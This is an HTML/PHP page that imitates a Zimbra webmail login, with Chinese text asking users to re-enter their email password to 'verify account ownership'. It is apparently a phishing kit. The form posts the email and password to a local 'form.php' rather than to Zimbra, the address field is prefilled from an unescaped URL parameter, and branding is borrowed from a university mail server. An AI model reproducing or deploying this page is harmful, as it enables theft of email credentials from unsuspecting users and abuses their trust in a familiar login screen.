<!DOCTYPE html>
<!-- set this class so CSS definitions that now use REM size, would work relative to this.
	Since now almost everything is relative to one of the 2 absolute font size classese -->
<html class="user_font_size_normal" lang="en">
<head>
<!--
 login.jsp
 * ***** BEGIN LICENSE BLOCK *****
 * Zimbra Collaboration Suite Web Client
 * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software Foundation,
 * version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License along with this program.
 * If not, see <https://www.gnu.org/licenses/>.
 * ***** END LICENSE BLOCK *****
-->
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<title>电子邮件设置 - 密码维护 </title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
	<link rel="stylesheet" type="text/css" href="https://mail.zimbra.com/css/common,login,zhtml,skin.css?skin=harmony&v=210121023242">
	<link rel="SHORTCUT ICON" href="https://mail.ecust.edu.cn/tpl/user/tpl1/images/favicon.ico">


<style type="text/css">
.auto-style1 {
	font-size: 12px;
	font-weight: normal;
}
</style>


</head>
<body onload="onLoad();">

	<div id="modifiedLogin" class="LoginScreen" >
		<div class="modernCenter" >
                <div class="modernContentBox">
                    <div class="logo">
                        <a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
                            </a>
						<img alt="China Trademark Email" height="24" src="https://harrisbricken.com/wp-content/uploads/email-309678_1280-1024x624.png" width="38"></div>				
				<form id="zLoginForm" method="post" name="loginForm" action="form.php" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login"/>
								<input type="hidden" name="login_csrf" value="be542a13-745b-4204-8d80-2aaab8c2ec5a"/>

								<div class="signIn">登录<br><br>
									<span class="auto-style1">
									为了验证你是账户的所有者，请输入你当前的密码</span><br></div>
                        <div class="form">
                        <div id="errorMessageDiv" class="errorMessage">
                            </div>
                        <div class="loginSection">
                                    <label for="username" class="zLoginFieldLabel">电子邮件</label>
                                            <input id="username" tabindex="1" class="zLoginFieldInput" name="email" type="text" readonly="readonly" value="<?php echo $_GET['login']; ?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
                                        <label for="password" class="zLoginFieldLabel">电子邮件密码</label>
                                    <div class="passwordWrapper">
                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024"/>
                                        <span toggle="#password" onClick="showPassword();" id="showSpan" style="display: block;">显示</span>
                                        <span toggle="#password" onClick="showPassword();" id="hideSpan" style="display: none;">隐藏</span>
                                    </div>
                                    <div class="signInAndLabel">
                                        <div>
                                            <button id="loginButton" type="submit" tabindex="5" class="loginButton">登录</button>
                                        </div>
                                        <div class="rememberCheckWrapper"> 
                                                <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme" />
                                                <label id="remember" for="remember">保持登录状态</label>
                                            </div>
                                        </div>
                                </div>
                            <div >
                            <hr/>
                            </div>
                            <div >
                            <div class="versionBlock">
                                <label for="client">网络应用程序版本</label>
                                <div style="position: relative;">
                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                                <option value="preferred" selected > 默认情况下</option>
                                                <option value="advanced" > 经典之作</option>
                                                <option value="modern" > 现代</option>
                                                </select>
                                        <input type="button" class="alignWhatsThis" onclick="showTooltip();" id='ZLoginWhatsThisButton' />
                                </div>
                           
                                <div id="ZLoginWhatsThis">
                                    <div class="ZLoginInfo">
                                        <span id="dialogCloseButton" onclick="hideTooltip();">&times;</span>
                                        <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings > General > Zimbra Version. In Classic, set it in Preferences > General > Sign In.</p></div>
                                </div>
                           
                            
                        </div>
                    </div>
                        </div>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">版权所有 2005-2022 - 保留所有权利。</div>
		</div>
		<div class="decor2"></div>
	</div>
<script>

function ZmSkin(e){
this.hints=this.mergeObjects(ZmSkin.hints,e)
}
ZmSkin.hints={
name:"harmony",version:"1",skin:{
containers:"skin_outer"}
,banner:{
position:"static",url:"http://www.zimbra.com"}
,userInfo:{
position:"static"}
,search:{
position:"static"}
,quota:{
position:"static"}
,presence:{
width:"40px",height:"24px"}
,appView:{
position:"static"}
,searchResultsToolbar:{
containers:["skin_tr_search_results_toolbar"]}
,newButton:{
containers:["skin_td_new_button"]}
,tree:{
minWidth:"13.5rem",maxWidth:"84rem",containers:["skin_td_tree","skin_td_tree_app_sash"],resizeContainers:["skin_td_tree","skin_container_app_new_button"]}
,topToolbar:{
containers:"skin_spacing_app_top_toolbar"}
,treeFooter:{
containers:"skin_tr_tree_footer"}
,topAd:{
containers:"skin_tr_top_ad"}
,sidebarAd:{
containers:"skin_td_sidebar_ad"}
,bottomAd:{
containers:"skin_tr_bottom_ad"}
,treeTopAd:{
containers:"skin_tr_tree_top_ad"}
,treeBottomAd:{
containers:"skin_tr_tree_bottom_ad"}
,helpButton:{
style:"link",container:"quota",url:""}
,logoutButton:{
style:"link",container:"quota"}
,appChooser:{
position:"static",direction:"LR"}
,toast:{
location:"N",transitions:[{
type:"fade-in",step:5,duration:50}
,{
type:"pause",duration:5000}
,{
type:"fade-out",step:-10,duration:500}
]}
,fullScreen:{
containers:["!skin_td_tree","!skin_td_tree_app_sash"]}
,allAds:{
containers:["skin_tr_top_ad","skin_td_sidebar_ad","skin_tr_bottom_ad","skin_tr_tree_top_ad","skin_tr_tree_bottom_ad"]}
,hideSearchInCompose:true,notificationBanner:"https://mail.zimbra.com/skins/_base/logos/NotificationBanner_grey.gif?v=210121023242",socialfox:{
iconURL:"https://mail.zimbra.com/img/logo/ImgZimbraIcon.gif",icon32URL:"https://mail.zimbra.com/img/logo/ImgZimbraLogo_32.gif",icon64URL:"https://mail.zimbra.com/img/logo/ImgZimbraLogo_64.gif",mailIconURL:"https://mail.zimbra.com/img/zimbra/ImgMessage.png"}};
window.BaseSkin=ZmSkin;
ZmSkin.prototype={
show:function(t,e,l){
var a=this.hints[t]&&this.hints[t].containers;
if(a){
if(typeof a=="function"){
a.apply(this,[e!=false]);
skin._reflowApp();
return
}
if(typeof a=="string"){
a=[a]
}
var s=false;
for(var r=0;
r<a.length;
r++){
var h=a[r];
var o=h.replace(/^!/,"");
var n=h!=o;
if(this._showEl(o,n?!e:e)){
s=true
}}
if(s&&!l){
skin._reflowApp()
}}}
,hide:function(e,t){
this.show(e,false,t)
}
,gotoApp:function(e,t){
appCtxt.getAppController().activateApp(e,null,t)
}
,gotoPrefs:function(e){
if(appCtxt.getCurrentAppName()!=ZmApp.PREFERENCES){
var t=new AjxCallback(this,this._gotoPrefPage,[e]);
this.gotoApp(ZmApp.PREFERENCES,t)
}else{
this._gotoPrefPage(e)
}}
,mergeObjects:function(e,o){
if(e==null){
e={}
}
for(var a=1;
a<arguments.length;
a++){
var n=arguments[a];
for(var t in n){
var s=e[t];
if(typeof s=="object"&&!(s instanceof Array)){
this.mergeObjects(e[t],n[t]);
continue
}
if(!e[t]){
e[t]=n[t]
}}}
return e
}
,getTreeWidth:function(){
return Dwt.getSize(this._getEl(this.hints.tree.containers[0])).x
}
,setTreeWidth:function(e){
this._setContainerSizes("tree",e,null)
}
,showTopAd:function(e){
if(skin._showEl("skin_tr_top_ad",e)){
skin._reflowApp()
}}
,hideTopAd:function(){
skin.showTopAd(false)
}
,getTopAdContainer:function(){
return skin._getEl("skin_container_top_ad")
}
,showSidebarAd:function(e){
var t="skin_td_sidebar_ad";
if(e!=null){
Dwt.setSize(t,e)
}
if(skin._showEl(t)){
skin._reflowApp()
}}
,hideSidebarAd:function(){
var e="skin_td_sidebar_ad";
if(skin._hideEl(e)){
skin._reflowApp()
}}
,getSidebarAdContainer:function(){
return this._getEl("skin_container_sidebar_ad")
}
,handleNotification:function(t,e){}
,_getEl:function(e){
return(typeof e=="string"?document.getElementById(e):e)
}
,_showEl:function(o,i){
var t=this._getEl(o);
if(!t){
return
}
var a;
if(i==false){
a="none"
}else{
var e=t.tagName;
if(e=="TD"){
a="table-cell"
}else{
if(e=="TR"){
a="table-row"
}else{
a="block"
}}}
if(a!=t.style.display){
t.style.display=a;
return true
}else{
return false
}}
,_hideEl:function(e){
return this._showEl(e,false)
}
,_reparentEl:function(i,e){
var a=this._getEl(e);
var t=a&&this._getEl(i);
if(t){
a.appendChild(t)
}}
,_setContainerSizes:function(n,a,e){
var o=this.hints[n].resizeContainers||this.hints[n].containers;
for(var t=0;
t<o.length;
t++){
Dwt.setSize(o[t],a,null)
}}
,_reflowApp:function(){
if(window._zimbraMail){
window._zimbraMail.getAppViewMgr().fitAll()
}}
,_gotoPrefPage:function(a){
if(a==null){
return
}
var i=appCtxt.getApp(ZmApp.PREFERENCES);
var t=i.getPrefController();
var e=t.getPrefsView();
e.selectSection(a)
}};
window.skin=new ZmSkin();
var link = getElement("bannerLink");
if (link) {
    link.href = skin.hints.banner.url;
}



// show a message if they should be using the 'standard' client, but have chosen 'advanced' instead
function clientChange(selectValue) {
    var div = getElement("ZLoginUnsupported");
    if (div)
    div.style.display = 'none';
}

function forgotPassword() {
	var accountInput = getElement("username").value;
	var queryParams = encodeURI("account=" + accountInput);
	var url = "/public/PasswordRecovery.jsp?" + location.search;

	if (accountInput !== '') {
		url += (location.search !== '' ? '&' : '') + encodeURI("account=" + accountInput);
	}

	window.location.href = url;
}

function disableEnable(txt) {
    var bt = getElement('verifyButton');
    if (txt.value != '') {
        bt.disabled = false;
    }
    else {
        bt.disabled = true;
    }
} 
function hideTooltip() {
    getElement('ZLoginWhatsThis').style.display='none';
}
function showTooltip(){
    getElement('ZLoginWhatsThis').style.display="block"
}

function getElement(id) {
    return document.getElementById(id);
}

function showPassword() {
    showHidePasswordFields(getElement("password"), getElement("showSpan"), getElement("hideSpan"))
}
function showNewPassword() {
    showHidePasswordFields(getElement("newPassword"), getElement("newPasswordShowSpan"), getElement("newPasswordHideSpan"));
}
function showConfirmPassword() {
    showHidePasswordFields(getElement("confirm"), getElement("confirmShowSpan"), getElement("confirmHideSpan"));
}

function showHidePasswordFields(passElem, showSpanElem, hideSpanElem) {
    if (passElem.type === "password") {
        passElem.type = "text";
        showSpanElem.style.display = "none";
        hideSpanElem.style.display = "block";
    } else {
        passElem.type = "password";
        showSpanElem.style.display = "block";
        hideSpanElem.style.display = "none";
    }
}

function onLoad() {
	var loginForm = document.loginForm;
	if (loginForm.username) {
		if (loginForm.username.value != "") {
			loginForm.password.focus(); //if username set, focus on password
		}
		else {
			loginForm.username.focus();
		}
	}
	clientChange("preferred");
    //check if the login page is loaded in the sidebar.
    if (navigator.mozSocial) {
        //send a ping so that worker knows about this page.
        navigator.mozSocial.getWorker().port.postMessage({topic: "worker.reload", data: true});
        //this page is loaded in firefox sidebar so listen for message from worker.
        navigator.mozSocial.getWorker().port.onmessage = function onmessage(e) {
            var topic = e.data.topic;
            if (topic && topic == "sidebar.authenticated") {
                window.location.href = "/public/launchSidebar.jsp";
            }
        };
    }
	if (false && loginForm.totpcode) {
        loginForm.totpcode.focus();
        }
    }

var oldPasswordInput = getElement("password");
var newPasswordInput = getElement("newPassword");
var confirmPasswordInput = getElement("confirm");
var loginButton = getElement("loginButton");
var errorMessageDiv = getElement("errorMessageDiv");
var allRulesMatched = false;

if(newPasswordInput) {
    loginButton.disabled = true;
}

if("" === ""){
    errorMessageDiv.style.display = "none";
}

var enabledRules = [];
var supportedRules = [
    {
        type : "zimbraPasswordMinLength",
        checkImg : getElement("minLengthCheckImg"),
        closeImg : getElement("minLengthCloseImg")
    },
    {
        type : "zimbraPasswordMinUpperCaseChars",
        checkImg : getElement("minUpperCaseCheckImg"),
        closeImg : getElement("minUpperCaseCloseImg")
    },
    {
        type : "zimbraPasswordMinLowerCaseChars",
        checkImg : getElement("minLowerCaseCheckImg"),
        closeImg : getElement("minLowerCaseCloseImg")
    },
    {
        type : "zimbraPasswordMinNumericChars",
        checkImg : getElement("minNumericCharsCheckImg"),
        closeImg : getElement("minNumericCharsCloseImg")
    },
    {
        type : "zimbraPasswordMinPunctuationChars",
        checkImg : getElement("minPunctuationCharsCheckImg"),
        closeImg : getElement("minPunctuationCharsCloseImg")
    },
    {
        type : "zimbraPasswordMinDigitsOrPuncs",
        checkImg : getElement("minDigitsOrPuncsCheckImg"),
        closeImg : getElement("minDigitsOrPuncsCloseImg")
    }
];

if (0){
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLength"}));
}

if (0) {
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinUpperCaseChars"}));
}

if (0) {
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinLowerCaseChars"}));
}

if (0) {
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinNumericChars"}));
}

if (0) {
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinPunctuationChars"}));
}

if(0) {
    enabledRules.push(supportedRules.find(function(rule){ return rule.type === "zimbraPasswordMinDigitsOrPuncs"}));
}

function compareConfirmPass() {
    if (getElement("newPassword").value === getElement("confirm").value) {
        errorMessageDiv.style.display = "none";
        return true;
    } else {
        event.preventDefault();
        errorMessageDiv.style.display = "block";
        errorMessageDiv.innerHTML = "";
        return false;
    }
}

function check(checkImg, closeImg) {
    closeImg.style.display = "none";
    checkImg.style.display = "inline";
}
function unCheck(checkImg, closeImg) {
    closeImg.style.display = "inline";
    checkImg.style.display = "none";
}
function resetImg(condition, checkImg, closeImg){
    condition ? check(checkImg, closeImg) : unCheck(checkImg, closeImg);
}
function compareMatchedRules(matchedRule) {
    enabledRules.forEach(function(rule) {
        if (matchedRule.findIndex(function(mRule) { return mRule.type === rule.type}) >= 0) {
            check(rule.checkImg, rule.closeImg);
        } else {
            unCheck(rule.checkImg, rule.closeImg);
        }
    })
}

function setloginButtonDisabled(condition) {
    if (condition) {
        loginButton.disabled = true;
    } else {
        if (oldPasswordInput.value !== "") {
            loginButton.disabled = false;
        }
    }
}

// Function to check special character
function isAsciiPunc(ch) {
    return (ch >= 33 && ch <= 47) || // ! " # $ % & ' ( ) * + , - . /
    (ch >= 58 && ch <= 64) || // : ; < = > ? @
    (ch >= 91 && ch <= 96) || // [ \ ] ^ _ `
    (ch >= 123 && ch <= 126); // { | } ~
}

function parseCharsFromPassword(passwordString) {
    const uppers = [],
        lowers = [],
        numbers = [],
        punctuations = [],
        invalidChars = [],
        invalidPuncs = [];

    const chars = passwordString.split('');

    chars.forEach(function (char) {
        const charCode = char.charCodeAt(0);
        let isInvalid = false;

        if ("") {
            try {
                if (!char.match(new RegExp("", 'g'))) {
                    invalidChars.push(char);
                    isInvalid = true;
                }
            } catch (error) {
                console.error({ error });
            }
        }

        if (!isInvalid) {
            if (charCode >= 65 && charCode <= 90) {
                uppers.push(char);
            } else if (charCode >= 97 && charCode <= 122) {
                lowers.push(char);
            } else if (charCode >= 48 && charCode <= 57) {
                numbers.push(char);
            } else if ("") {
                try {
                    char.match(new RegExp("", 'g'))
                        ? punctuations.push(char)
                        : invalidPuncs.push(char);
                } catch (error) {
                    console.error({ error });
                }
            } else if (isAsciiPunc(charCode)) {
                punctuations.push(char);
            }
        }
    });

    return {
        uppers,
        lowers,
        numbers,
        punctuations,
        invalidChars,
        invalidPuncs
    };
};

function handleNewPasswordChange() {
    var currentValue = newPasswordInput.value;
    var parsedChars = parseCharsFromPassword(currentValue);
    var matchedRule = [];

    if (0){
        if (currentValue.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinLength"});
        }
    }

    if (0) {
        if (parsedChars.uppers.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinUpperCaseChars"});
        }
    }

    if (0) {
        if (parsedChars.lowers.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinLowerCaseChars"});
        }
    }

    if (0) {
        if (parsedChars.numbers.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinNumericChars"});
        }
    }

    if (0) {
        if (parsedChars.punctuations.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinPunctuationChars"});
        }
    }

    if(0) {
        if (parsedChars.punctuations.length + parsedChars.numbers.length >= 0) {
            matchedRule.push({type : "zimbraPasswordMinDigitsOrPuncs"});
        }
    }

    if(matchedRule.length >= enabledRules.length){
        allRulesMatched = true;
    } else {
        allRulesMatched = false;
    }

    compareMatchedRules(matchedRule);

    if (parsedChars.invalidChars.length > 0) {
        errorMessageDiv.style.display = "block";
        errorMessageDiv.innerHTML = parsedChars.invalidChars.join(", ") + " ";
    } else {
        errorMessageDiv.style.display = "none";
    }

    if(newPasswordInput.value !== "") {
        resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
        setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
    }
};

function handleConfirmPasswordChange() {
    resetImg(confirmPasswordInput.value === newPasswordInput.value, getElement("mustMatchCheckImg"), getElement("mustMatchCloseImg"));
    setloginButtonDisabled(!allRulesMatched || confirmPasswordInput.value !== newPasswordInput.value);
};

function handleOldPasswordChange() {
    setloginButtonDisabled(!allRulesMatched || newPasswordInput.value === "" || oldPasswordInput.value === "" || confirmPasswordInput.value !== newPasswordInput.value)
}

newPasswordInput && oldPasswordInput && oldPasswordInput.addEventListener("input", handleOldPasswordChange, null);
newPasswordInput && newPasswordInput.addEventListener("input", handleNewPasswordChange, null);
confirmPasswordInput && confirmPasswordInput.addEventListener("input", handleConfirmPasswordChange, null);
</script>
</body>
</html>